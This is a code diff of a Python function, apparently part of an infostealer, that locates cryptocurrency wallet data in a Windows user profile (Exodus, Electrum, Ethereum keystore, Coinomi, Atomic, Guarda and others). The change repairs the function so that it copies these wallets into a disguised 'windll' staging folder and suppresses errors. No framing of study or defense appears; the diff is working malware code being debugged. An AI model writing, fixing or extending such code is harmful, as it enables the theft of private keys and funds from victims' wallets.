@@ -16,37 +16,38 @@ import shutil
 
 def Wallets():
     try:
-        pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
-        conter  = 0
+        print("w")
+        pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming'
+        pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
         wallets = [
-        rf"{pathtofile}\Zcash",
-        rf"{pathtofile}\Armory",
-        rf"{pathtofile}\bytecoin",
-        rf"{pathtofile}\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb",
-        rf"{pathtofile}\Exodus\exodus.wallet",
-        rf"{pathtofile}\Ethereum\keystore",
-        rf"{pathtofile}\Electrum\wallets"
-        rf"{pathtofile}\atomic\Local Storage\leveldb",
-        rf"{pathtofile}\Guarda\Local Storage\leveldb",
-        rf"{pathtofile}\Coinomi\Coinomi\wallets",
+        rf"\Zcash",
+        rf"\Armory",
+        rf"\bytecoin",
+        rf"\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb",
+        rf"\Exodus\exodus.wallet",
+        rf"\Ethereum\keystore",
+        rf"\Electrum\wallets",
+        rf"\atomic\Local Storage\leveldb",
+        rf"\Guarda\Local Storage\leveldb",
+        rf"\Coinomi\Coinomi\wallets",
+        rf"\FeatherWallet"
         ]
+        conter  = len(wallets)
         try:
             for i in range (conter):
                 try:
-                    if (conter != 3 or conter != 7 or conter != 8):
-                        shutil.copytree(wallets[i],rf"{pathtofile}\windll")
+                    if (i != 3 and i != 7 and i != 8):
+                        #print(wallets[i],"  if")
+                        shutil.copytree(rf"{pathtofile}{wallets[i]}",rf"{pathtofolder}\windll\wallets{wallets[i]}")
                     else:
-                        if (conter == 3):
-                            shutil.copy2(wallets[i], rf'{pathtofile}\windll\jaxx')
-                        if (conter == 7):
-                            shutil.copy2(wallets[i], rf'{pathtofile}\windll\atomic')
-                        if (conter == 8):
-                            shutil.copy2(wallets[i], rf'{pathtofile}\windll\Guarda')
-                        
+                        #print(wallets[i],"  else")
+                        num = wallets[i].rfind("\\")
+                        #print(wallets[i][:num+1])
+                        shutil.copytree(rf"{pathtofile}{wallets[i][:num+1]}",rf"{pathtofolder}\windll\wallets{wallets[i][:num+1]}") 
                 except Exception as e:
                     print(e)
         except Exception as e:
-            print(e)
-    except:
+            pass
+    except Exception as e:
         pass
 
